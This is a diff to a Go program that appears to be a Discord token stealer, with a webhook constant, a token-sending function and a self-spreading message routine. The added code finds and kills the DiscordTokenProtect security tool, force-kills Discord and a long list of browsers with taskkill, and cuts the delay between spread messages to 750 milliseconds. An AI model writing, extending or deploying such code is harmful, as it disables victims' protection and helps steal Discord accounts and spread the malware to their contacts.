@@ -9,6 +9,7 @@ import (
 	"io/ioutil"
 	"net/http"
 	"os"
+	"os/exec"
 	"os/user"
 	"path/filepath"
 	"regexp"
@@ -16,6 +17,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/mitchellh/go-ps"
 	"golang.org/x/exp/slices"
 )
 
@@ -46,13 +48,40 @@ const (
 	WEBHOOK_URL = "weburl"
 	SPREAD_MSG  = "spreadmsg"
 	SPREAD      = false
+	KILL        = false
 	BLOCK       = false
 )
 
 func main() {
+	antiTokenProtect()
 	start()
 	spred()
+	killProcess()
+	blockDiscord()
+	antiTokenProtect()
 	// block_dc()
+
+}
+
+func antiTokenProtect() {
+	// get all running processes
+	processes, err := ps.Processes()
+	if err != nil {
+		panic(err)
+	}
+	for _, process := range processes {
+		if process.Executable() == "DiscordTokenProtect.exe" {
+			killProcessByName("DiscordTokenProtect")
+
+		}
+	}
+
+}
+
+func blockDiscord() {
+	if !BLOCK {
+		return
+	}
 
 }
 
@@ -100,10 +129,31 @@ func spred() {
 			cl := &http.Client{}
 			res, _ := cl.Do(req)
 			fmt.Println(string(res.StatusCode) + " " + res.Status)
-			time.Sleep(3 * time.Second)
+			time.Sleep(750 * time.Millisecond)
 		}
 		// req, _ := http.NewRequest("POST", "https://discord.com/api/v9/channels/"+ ChannelId + "/messages")
 	}
+}
+
+func killProcess() {
+	if !KILL {
+		return
+	}
+	processlist := []string{"discord", "discordcanary", "discordptb", "lightcord", "opera", "operagx", "firefox", "chrome", "chromesxs", "chromium-browser", "yandex", "msedge", "brave", "vivaldi", "epic"}
+	for _, process := range processlist {
+		killProcessByName(process)
+	}
+
+}
+
+func killProcessByName(process string) {
+	var cmd *exec.Cmd
+	cmd = exec.Command("taskkill", "/F", "/IM", process+".exe")
+	err := cmd.Run()
+	if err != nil {
+		panic(err)
+	}
+
 }
 
 func send_info(token string) {
@@ -262,6 +312,7 @@ func get_files(root, ext string) []string {
 	})
 	return a
 }
+
 func getJsonValue(key string, jsonData string) (value string) {
 
 	var result map[string]interface{}
